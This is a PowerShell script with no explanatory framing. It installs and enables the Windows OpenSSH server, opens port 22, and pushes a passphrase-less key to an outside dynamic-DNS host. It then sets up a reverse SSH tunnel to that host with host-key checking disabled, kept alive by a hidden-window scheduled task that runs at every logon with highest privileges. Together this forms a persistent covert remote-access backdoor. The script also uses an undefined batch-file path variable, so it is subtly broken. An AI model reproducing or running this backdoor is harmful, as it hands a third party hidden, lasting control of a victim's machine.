# Ensure OpenSSH Client and Server are installed
$opensshClient = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Client*'
$opensshServer = Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Server*'

if ($opensshClient.State -ne "Installed") {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
}
if ($opensshServer.State -ne "Installed") {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
}

# Start and enable sshd
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Configure the firewall
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' `
        -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}

# Prepare SSH key path
$sshDir = "$env:USERPROFILE\.ssh"
$keyFile = "$sshDir\$($env:USERNAME)_ed25519"
$pubKeyFile = "$keyFile.pub"
$user = "nobody1"
$remote_host = "edcoretecmm.sytes.net"
$receivedPort = 2004
$logFile = "$env:USERPROFILE\ssh_reverse_tunnel.log"

# Create SSH key pair if not exists
if (-not (Test-Path $keyFile)) {
    mkdir $sshDir -Force | Out-Null
    ssh-keygen -t ed25519 -f $keyFile -N ""
}

# Add public key to remote server
$publicKey = Get-Content $pubKeyFile
ssh -i $keyFile $user@$remote_host "mkdir -p ~/.ssh && echo '$publicKey' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Create the batch content with escaped quotes
$batContent = @"
@echo off
echo [INFO] Starting reverse SSH tunnel at %date% %time% >> "$logFile"
timeout /t 10 /nobreak > nul
ssh -o "StrictHostKeyChecking=no" -o "ExitOnForwardFailure=yes" -i "$keyFile" -N -R $receivedPort`:localhost`:22 $user@$remote_host >> "$logFile" 2>&1
"@

# Save it as a batch file
Set-Content -Path $batFilePath -Value $batContent -Encoding ASCII

# Schedule task to run the .bat file at user login with highest privileges
$taskName = "ReverseSSHTunnel"
$taskExists = schtasks /query /tn $taskName 2>$null

if ($LASTEXITCODE -ne 0) {
    schtasks /create /tn $taskName `
        /tr "`"$batFilePath`"" `
        /sc onlogon `
        /rl HIGHEST `
        /f `
        /ru "$env:USERNAME"
}

Write-Host "[!] Reverse SSH tunnel setup complete."
Write-Host "[*] You can test it now by running: $batFilePath"

# Run the reverse tunnel .bat file now
Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
